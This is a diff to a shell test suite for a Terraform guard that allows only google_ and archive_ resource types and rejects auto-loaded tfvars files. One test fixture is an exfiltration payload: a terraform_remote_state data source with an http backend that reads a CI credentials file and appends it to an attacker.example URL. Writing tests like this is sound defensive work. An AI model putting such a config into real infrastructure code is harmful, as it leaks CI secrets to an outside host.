@@ -633,6 +633,87 @@ run_case provider_block_for_a_provider_not_on_the_allowlist 1 'provider "random"
 provider "random" {}
 EOF
 
+# ---- R6 (Architect c7086588242): resource and data TYPES are an allowlist, not a list of dangerous names ----
+# The built-in terraform_remote_state is a plan-time request to any host with plain-HCL config; no denylist of
+# provider names catches it. Only google_* (google and google-beta) and archive_* may be declared.
+run_case r6_terraform_remote_state 1 '"terraform_remote_state" belongs to a provider' <<'EOF'
+data "terraform_remote_state" "x" {
+  backend = "http"
+  config = {
+    address = "https://attacker.example/${file("/home/runner/work/_temp/creds.json")}"
+  }
+}
+EOF
+run_case r6_unquoted_terraform_remote_state 1 '"terraform_remote_state" belongs to a provider' <<'EOF'
+data terraform_remote_state x {
+  backend = "http"
+}
+EOF
+run_case r6_comment_prefixed_terraform_remote_state 1 '"terraform_remote_state" belongs to a provider' <<'EOF'
+/* x */ data "terraform_remote_state" "x" {
+  backend = "gcs"
+}
+EOF
+run_case r6_terraform_data_resource 1 '"terraform_data" belongs to a provider' <<'EOF'
+resource "terraform_data" "x" {
+  input = "y"
+}
+EOF
+run_case r6_random_resource 1 '"random_id" belongs to a provider' <<'EOF'
+resource "random_id" "x" {
+  byte_length = 4
+}
+EOF
+run_case r6_unknown_prefix_data 1 '"mystery_thing" belongs to a provider' <<'EOF'
+data "mystery_thing" "x" {}
+EOF
+# A type that merely CONTAINS an allowed prefix later on is not an allowed type (the prefix, not a substring).
+run_case r6_prefix_only_at_the_start 1 '"my_google_thing" belongs to a provider' <<'EOF'
+resource "my_google_thing" "x" {}
+EOF
+run_case r6_the_error_lists_the_allowed_prefixes 1 'must start with: archive_, google_' <<'EOF'
+resource "terraform_data" "x" {}
+EOF
+# Controls: the allowed families pass, google-beta shares google_, and an archive data source is fine.
+run_case r6_google_resource_and_data_pass 0 'ok \(' <<'EOF'
+resource "google_storage_bucket" "b" {
+  name = "x"
+}
+data "google_client_config" "c" {}
+resource "google_firebase_web_app" "w" {
+  display_name = "x"
+}
+data "archive_file" "a" {
+  type        = "zip"
+  source_dir  = "${path.module}/src"
+  output_path = "${path.root}/.terraform/tmp/a.zip"
+}
+EOF
+run_case r6_unquoted_allowed_types_pass 0 'ok \(' <<'EOF'
+resource google_storage_bucket b {
+  name = "x"
+}
+data archive_file a {
+  type        = "zip"
+  source_dir  = "${path.module}/src"
+  output_path = "${path.root}/.terraform/tmp/a.zip"
+}
+EOF
+# The allowlist follows the caller's allowlist: a narrower one refuses a family the wider one accepted.
+out_narrow=$(HCL2JSON="$HCL2JSON" bash "$guard" "$tmp/r6_google_resource_and_data_pass" hashicorp/google 2>&1); rc=$?
+if [ "$rc" = 1 ] && printf '%s' "$out_narrow" | grep -q '"archive_file" belongs to a provider'; then echo "ok   r6_prefixes_follow_the_callers_allowlist"; else echo "FAIL r6_prefixes_follow_the_callers_allowlist: rc=$rc $out_narrow"; failures=$((failures + 1)); fi
+
+# R6 nit: an auto-loaded variable file in the planned root overrides the workflow's TF_VAR_ values.
+for vf in terraform.tfvars terraform.tfvars.json prod.auto.tfvars x.auto.tfvars.json; do
+  EXTRA_FILE="environments/dev/$vf" EXTRA_BODY='project_id = "x"
+' run_case "r6_tfvars_$vf" 1 'an auto-loaded variable file in the planned root is not accepted' <<<"$CLEAN"
+done
+# Controls: a variable file in ANOTHER environment is not loaded by the planned root, and a plain .tfvars (not auto-loaded) is not either.
+EXTRA_FILE=environments/qa/terraform.tfvars EXTRA_BODY='project_id = "x"
+' run_case r6_tfvars_in_another_environment_passes 0 'ok \(' <<<"$CLEAN"
+EXTRA_FILE=environments/dev/example.tfvars EXTRA_BODY='project_id = "x"
+' run_case r6_a_named_tfvars_is_not_auto_loaded 0 'ok \(' <<<"$CLEAN"
+
 # A file that does not PARSE is a refusal, never a pass (hcl2json says so; the guard cannot judge what it cannot read).
 run_case garbage_tf_does_not_parse 1 'does not parse as HCL' <<'EOF'
 resource "a" "b" {
@@ -650,7 +731,7 @@ LOCK='provider "registry.terraform.io/hashicorp/google" {
 ' run_case garbage_lockfile_does_not_parse 1 'does not parse as HCL' <<<"$CLEAN"
 # Positive control for the parse-failure rule: the same file, repaired, is clean.
 run_case the_repaired_file_is_clean 0 'ok \(' <<'EOF'
-resource "a" "b" {
+resource "google_storage_bucket" "b" {
   name = "x"
 }
 EOF
